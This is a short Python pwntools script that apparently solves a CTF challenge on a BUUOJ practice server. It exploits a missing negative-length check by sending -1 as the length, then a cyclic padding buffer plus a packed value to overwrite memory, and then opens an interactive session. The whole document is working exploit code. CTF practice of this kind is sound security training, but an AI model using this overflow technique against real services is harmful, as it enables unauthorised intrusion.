from pwn import *


p = remote("node4.buuoj.cn", 25794)


# don't check length < 0 --> buffer overflow
length = -1
p.sendlineafter("your username length: ", str(length))
name = cyclic(0x40)+p32(0x1)
p.sendlineafter("whats your username?\n", name)
print(p.recv())

p.interactive()


